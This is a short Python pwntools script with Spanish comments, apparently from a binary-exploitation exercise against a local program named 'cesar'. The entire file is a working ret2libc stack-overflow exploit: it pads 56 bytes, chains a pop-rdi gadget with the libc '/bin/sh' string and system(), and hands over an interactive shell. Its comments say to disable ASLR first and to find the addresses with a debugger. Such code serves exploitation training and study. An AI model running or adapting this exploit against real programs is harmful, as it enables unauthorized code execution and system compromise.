#!/usr/bin/python3

# No olvidar quitar ASLR

from pwn import *

# Hay que encontrar cuales son en la distro
libp = "/lib/x86_64-linux-gnu/libc.so.6"

# Hay que encontrarlos con el debugger
POP_RDI = 0x401393
LIBC_AD = 0x00007ffff79e2000

# Cargamos los binarios (victima y libc) para tomar los s√≠mbolos
elf = ELF("./cesar")
libc = ELF(libp)
io = process(elf.path)
# io = gdb.debug(elf.path)


# Por si queremos analizar el payload
def to_file(payload):
    with open("payload.out", "wb") as pay:
        pay.write(payload)

# Explotamos para sacar la shell
def exploit(payload):
    io.sendline(payload)
    io.sendline("13")
    io.interactive()

def payload(offset=56):
    pop_rdi = POP_RDI
    # Sacamos las direcciones de system y de la string de shell
    system = libc.sym["system"]
    shell = next(libc.search(b"/bin/sh"))
    # [ aaaaaaaaaaaa...aaaa <gadget addr> <sh string addr> <system addr> ]
    return flat(offset * 'a',
                pop_rdi,
                shell,
                system,
                endianness="little", word_size=64)

libc.address = LIBC_AD
pay = payload()
exploit(pay)
# to_file(pay)

